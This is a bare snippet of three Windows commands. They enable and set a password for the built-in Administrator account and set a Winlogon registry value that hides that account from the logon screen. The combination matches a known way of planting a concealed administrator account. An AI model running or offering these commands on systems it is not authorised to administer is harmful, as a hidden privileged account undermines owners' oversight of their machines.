reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f
net user Administrator /active:yes
net user Administrator *
